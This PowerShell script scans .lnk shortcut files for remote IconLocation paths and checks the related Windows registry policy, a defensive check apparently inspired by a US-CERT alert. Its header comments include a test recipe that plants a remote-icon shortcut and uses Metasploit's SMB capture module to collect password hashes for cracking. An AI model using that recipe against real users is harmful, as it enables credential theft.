#
# author: @b00010111
# powershell script searches a given path or file and determines if .lnk files with remote IconLocation are present and print them to std out.
# EXPERIMENTAL: checks whether the host has the registry configured to allow or disallow remote Icon locations
# errors will we written to  .shortcut_check.ps1_error.txt in current working directory
# if you rename the script errors will be written to ".$NEWSCRIPTNAME_error.txt"
# if no options are given help is shown
# inspired by https://www.us-cert.gov/ncas/alerts/TA18-074A, persistence via lnk File manipulation and using remote IconLocation path
#
# Options:
# -p (-path) # to specify a path 
# -f (-file) # for a specific .lnk file
# -v (-verbose) y # if you want to see all found IconLocations
# EXPERIMENTAL feature!!!! -r (-registry) y  #specify -r y to check registry if remote IconLocation is allowed or not. EXPERIMENTAL feature!!!!
#
# usage examples:
# .\shortcut_check.ps1 -p C:\ -r y -v y
# .\shortcut_check.ps1 -p C:\
# .\shortcut_check.ps1 -f C:\Users\exampleUser\Desktop\test_links\TEST.lnk -v y -r y
# .\shortcut_check.ps1 -f C:\Users\exampleUser\Desktop\test_links\TEST.lnk
#
# depending on your system configuration you might need to make the script runable
# see the following link for help:
# http://www.tech-recipes.com/rx/9902/how-to-run-your-own-powershell-scripts-cmdlets/
#

###############################################################################
# For testing create a lnk (shortcut ) file 
# run in powershell
# $sourcepath = "C:\Users\exampleUser\Desktop\Test.lnk"
# $destination = "C:\Users\exampleUser\Desktop\Test1.lnk"
# Copy-Item $sourcepath $destination  ## Get the lnk we want to use as a template
# $shell = New-Object -COM WScript.Shell
# $shortcut = $shell.CreateShortcut($destination)  ## Open the lnk
# $shortcut.IconLocation = "//172.1.1.1/remoteIcon"  ## Make changes
# $shortcut.Description = "Our new link"  ## This is the "Comment" field
# $shortcut.Save()  ## Save
# now setup an smb server/ listener on 172.1.1.1 (for example run kali and use msfconsole
# msf > use auxiliary/server/capture/smb
# msf auxiliary(smb) > set JOHNPWFILE /tmp/smbhashes.txt # will save hases to /tmp/smbhashes.txt for later cracking with john
# msf auxiliary(smb) > run
#
###############################################################################

# EXPERIMENTAL... 
# Set key to testing.
# New-Item -Path HKLM:\Software\Policies\Microsoft\Windows\Explorer -Force
# New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Explorer -Name EnableShellShortcutIconRemotePath -Value 1 -PropertyType DWORD -Force
# New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Explorer -Name EnableShellShortcutIconRemotePath -Value 0 -PropertyType DWORD -Force
#
# Policy path: Windows Components\File Explorer
# Scope: Machine
# Supported on: At least Windows Server 2012 Windows 8 or Windows RT
# Registry settings: HKLM\Software\Policies\Microsoft\Windows\Explorer!EnableShellShortcutIconRemotePath
# Filename: WindowsExplorer.admx
#
# Allow the use of remote paths in file shortcut icons
# This policy setting determines whether remote paths can be used for file shortcut (.lnk file) icons. If you enable this policy setting file
# shortcut icons are allowed to be obtained from remote paths.If you disable or do not configure this policy setting
# file shortcut icons that use remote paths are prevented from being displayed.
# Note: Allowing the use of remote paths in file shortcut icons can expose users’ computers to security risks.
# EXPERIMENTAL... 


param(
   [string] $path = "",
   [string] $file = "",
   [string] $verbose = "",
   [string] $registry = ""
   )

# set name for error file
$errorPath = "." + $MyInvocation.MyCommand.Name + "_error.txt"
if ($registry -ne "") {   
	write-output "###################################################################################################"
	write-output "Check registry if remote IconLocation is experimental at the moment and need more verification"
	write-output "Currently setting the registry key was tested with Windows 10 and seems to be NOT effective "
	write-output "###################################################################################################"
	
	# check if registry key exists and how it if configured
	$essirp = Get-ItemPropertyValue 'HKLM:\Software\Policies\Microsoft\Windows\Explorer' 'EnableShellShortcutIconRemotePath' -ErrorAction SilentlyContinue
	if ($essirp.Length -eq 0) {
		write-output " HKLM\Software\Policies\Microsoft\Windows\Explorer!EnableShellShortcutIconRemotePath could not be found."
	}
	elseif ($essirp -eq 0){
		write-output "HKLM\Software\Policies\Microsoft\Windows\Explorer!EnableShellShortcutIconRemotePath is set to 0."
		write-output "This means remote icons are not allowed in shortcut file."
	}
	else {
		write-output "HKLM\Software\Policies\Microsoft\Windows\Explorer!EnableShellShortcutIconRemotePath is set to 1."
		write-output "This means remote icons are allowed within shortcut files."
	}

	$in = Read-host "Continue and search .lnk (shortcut) files with remote IconLocatoin? (y/n/Default:y)"
	#write-output "$in was entered"
	#all input except n/N will terminate 
	if ($in -eq "N"){
		Exit
	}
}
 
$WshShell = new-object -comobject "WScript.Shell"       # Instantiate the wscript.shell COM object

if ($path -ne "") {
    $shortcuts = get-childitem -path $path -filter "*.lnk" -rec -ErrorAction SilentlyContinue -ErrorVariable scevar # Find all .lnk files, recursive in to subdirectories
	# For each file, pass the fullname to the COM object to open the shortcut and enumerate the properties
	$shortcuts | foreach-object {
		Try{
			$sc = $WshShell.CreateShortcut($_.FullName)
			if ($sc.IconLocation -match "^//") {
				write-output "Found an .lnk file with remote IconLocation "
				write-output ("IconLocation: " + $sc.IconLocation)
				write-output "Full information:"
				$sc
			}
			if ($verbose -eq "y") {
				write-output ("verbose output -> checked file:")
				write-output ("Path: " + $sc.FullName)
				write-output ("IconLocation: " + $sc.IconLocation)
				#print complete item:
				#$sc
			}
		}
		Catch{
			$ErrorMessage = $_.Exception.Message
			write-output ("Error processing: " + $sc.FullName) >> $errorPath
			write-output ("ErrorMassage " + $ErrorMessage) >> $errorPath
			
		}

	}

	write-output " `r`n  `r`nThe following errors occurred while searching for .lnk files: `r`n" >> $errorPath 
	write-output $scevar >> $errorPath

	write-output ("Done `r`nCheck " + $errorPath + " for errors")
	write-output ("Script does append to " + $errorPath + " if you want a fresh error file please delete file on your own")
		
} elseif ($file -ne "") {
    $shortcut = get-item -path $file       # Get the single file
    if ($shortcut -ne $null) { # If exists, read the shortcut properties
		$sc = $WshShell.CreateShortcut($shortcut)
		if ($sc.IconLocation -match "^//") {
			write-output "Found an .lnk file with remote IconLocation "
			write-output ("IconLocation: " + $sc.IconLocation)
			write-output "Full information:"
			$sc
		}
		if ($verbose -eq "y") {
			write-output ("verbose output -> checked file:")
			write-output ("Path: " + $sc.FullName)
			write-output ("IconLocation: " + $sc.IconLocation)
			#print complete item:
			#$sc
		} 
	} 
} else {
    write-output "No arguments specified, please use either -p (-path) to specify a path or -f (-file) for a specific .lnk file"
	write-output "specify -v y if you want to see all found IconLocations, otherwise only remote IconLocations are shown"
	write-output "EXPERIMENTAL feature!!!! specify -r y to check registry if remote IconLocation is allowed or not. EXPERIMENTAL feature!!!! "
	write-output ("errors will we written to " + $errorPath + " in current working directory")
	write-output ("Script does append to " + $errorPath + " if you want a fresh error file please delete file on your own")
	
}

#-------#

